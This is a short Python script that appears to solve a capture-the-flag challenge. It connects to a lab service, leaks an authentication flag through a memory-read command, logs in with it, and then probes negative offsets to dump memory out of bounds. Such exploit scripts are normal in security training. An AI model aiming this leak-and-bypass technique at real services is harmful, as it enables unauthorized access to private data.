import socket

def session(cmds):
    s = socket.create_connection(("10.13.37.10", 20866), timeout=10)
    s.settimeout(2)
    def recv():
        buf = b""
        try:
            while True:
                chunk = s.recv(65536)
                if not chunk:
                    break
                buf += chunk
        except socket.timeout:
            pass
        return buf
    recv()
    results = []
    for c in cmds:
        s.sendall((c + "\n").encode())
        r = recv().decode(errors='replace')
        results.append((c, r))
    s.close()
    return results

import re

def get_auth1():
    s2 = socket.create_connection(("10.13.37.10", 20866), timeout=10)
    s2.settimeout(2)
    def recv2():
        buf = b""
        try:
            while True:
                chunk = s2.recv(65536)
                if not chunk:
                    break
                buf += chunk
        except socket.timeout:
            pass
        return buf
    recv2()
    s2.sendall(b"PEEK 0 64\n")
    r = recv2().decode(errors='replace')
    s2.close()
    line = r.strip().splitlines()[-1]
    data = bytes.fromhex(line[5:])
    m = re.search(rb"CTF\{[^}]*\}", data)
    return m.group(0).decode()

AUTH1_CODE = get_auth1()
print("AUTH1_CODE:", AUTH1_CODE)

cmds = [
    f"AUTH1 {AUTH1_CODE}",
    "PEEK 0 4096",
    "PEEK -256 256",
    "PEEK -1024 1024",
]
results = session(cmds)
for c, r in results:
    print(">>>", c)
    if c.startswith("PEEK"):
        line = r.strip().splitlines()[-1] if r.strip() else ""
        if line.startswith("DATA "):
            hexdata = line[5:]
            data = bytes.fromhex(hexdata)
            print(f"  len={len(data)}")
            # print only non-zero 16-byte chunks with their offset
            for off in range(0, len(data), 16):
                chunk = data[off:off+16]
                if any(b != 0 for b in chunk):
                    print(f"  off={off:5d}: {chunk.hex()}  {chunk}")
        else:
            print("  ", r.strip()[:200])
    else:
        print("  ", r.strip()[:200])
